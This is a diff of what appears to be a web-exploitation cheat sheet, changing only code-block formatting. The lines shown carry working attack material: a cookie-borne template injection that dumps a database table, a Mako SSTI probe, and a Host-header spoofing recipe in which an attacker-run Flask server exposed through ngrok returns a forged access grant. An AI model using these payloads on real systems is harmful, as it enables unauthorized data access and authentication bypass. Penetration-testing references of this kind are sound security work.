@@ -216,7 +216,7 @@ curl --cookie 'name=<%= Sequel::DATABASES.first[:players].all %>' ...
 
 ### Mako SSTI
 
-```python
+```text
 # Detection
 ${7*7}  # Returns 49
 
@@ -429,16 +429,16 @@ response, err := http.Get("http://" + c.Request.Host + "/validate")
 
 **Exploitation:**
 1. Set up an attacker-controlled server returning the desired response:
-   ```python
-   from flask import Flask
-   app = Flask(__name__)
+```python
+from flask import Flask
+app = Flask(__name__)
 
-   @app.route("/validate")
-   def validate():
-       return '{"access": true}'
+@app.route("/validate")
+def validate():
+    return '{"access": true}'
 
-   app.run(host='0.0.0.0', port=5000)
-   ```
+app.run(host='0.0.0.0', port=5000)
+```
 2. Expose via ngrok or public VPS, then send the request with a spoofed Host header:
    ```bash
    curl -H "Host: attacker.ngrok-free.app" https://target/api/secret-object
